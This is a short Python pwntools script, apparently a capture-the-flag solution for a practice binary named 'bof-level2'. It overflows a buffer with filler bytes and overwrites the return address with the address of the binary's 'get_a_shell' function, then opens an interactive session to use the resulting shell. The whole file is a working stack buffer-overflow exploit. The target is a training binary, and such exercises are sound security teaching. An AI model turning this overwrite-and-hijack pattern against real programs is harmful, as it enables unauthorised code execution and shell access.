#!/usr/bin/env python

from pwn import *

p = process('./bof-level2')
e = ELF('./bof-level2')

get_a_shell = e.symbols['get_a_shell']

buf = "1"*20 + "ABCDEFGH" + "BBBBCCCC" + p32(get_a_shell)

p.sendline(buf)

p.interactive()
